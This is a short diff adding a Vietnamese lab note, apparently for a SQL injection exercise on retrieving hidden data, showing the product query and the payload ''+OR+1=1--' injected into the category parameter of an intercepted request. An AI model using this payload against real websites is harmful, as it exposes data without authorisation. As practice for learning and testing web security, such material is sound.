@@ -1,0 +1,5 @@
+Truy xuất dữ liệu ẩn bằng mệnh đề WHERE
+VD: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+Bắt requests đổi category thành 
+'+OR+1=1--
+XONG
